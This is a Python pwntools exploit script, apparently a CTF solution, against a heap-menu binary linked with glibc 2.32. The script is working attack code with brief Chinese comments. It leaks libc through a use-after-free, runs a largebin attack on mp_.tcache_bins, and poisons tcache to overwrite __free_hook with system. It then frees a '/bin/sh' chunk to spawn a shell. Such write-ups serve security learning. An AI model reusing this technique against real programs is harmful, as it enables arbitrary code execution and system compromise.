#注意0x10字节对齐
from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=remote("node2.anna.nssctf.cn",28607)
io=process("./vuln")
libc=ELF("./libc-2.32.so")

def add(n,s):
    io.sendlineafter(b">",b"1")
    io.sendlineafter(b"Index: ",str(n))
    io.sendlineafter(b"Size: ",str(s))
    
def delete(n):
    io.sendlineafter(b">",b"2")
    io.sendlineafter(b"Index: ",str(n))
    
def edit(n,cc):
    io.sendlineafter(b">",b"3")
    io.sendlineafter(b"Index: ",str(n))
    io.sendafter(b"Content: ",cc)
    
def show(n):
    io.sendlineafter(b">",b"4")
    io.sendlineafter(b"Index: ",str(n))
    
add(0,0x520)
add(1,0x600)
add(2,0x510)

delete(0)
edit(0,b"a")
show(0)   #uaf泄露libc

leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x61-0x70-libc.sym[b"__malloc_hook"]
print("leak_addr: "+hex(leak_addr))
free_hook=leak_addr+libc.sym[b"__free_hook"]
sys_addr=leak_addr+libc.sym[b"system"]
mp_=leak_addr+0x1e3280   
tc_max_bins=mp_+0x50  #mp_.tcache_bins

edit(0,b"\x00")
add(13,0x900)   #将chunk0分配到largebin

payload=p64(leak_addr+0x1e4030)*2+p64(tc_max_bins-0x20)*2  #注意检查，修改chunk 0的bk_nextsize为tc_max_bins - 0x20处，来达到任意地址写一个堆块地址

edit(0,payload)

delete(2) #分配chunk2 到unsortedbin

add(15,0x900) #分配一个大堆块出发largebin attack

# gdb.attach(io)
# pause()

delete(1)
payload=b"a"*0xe8+p64(free_hook) #固定偏移
edit(0,payload)

add(1,0x600) 

edit(1, p64(sys_addr))

add(6,0x600)
edit(6,b"/bin/sh\x00")
delete(6)  #劫持free_hook为system函数，free掉"/bin/sh"堆块即可

io.interactive()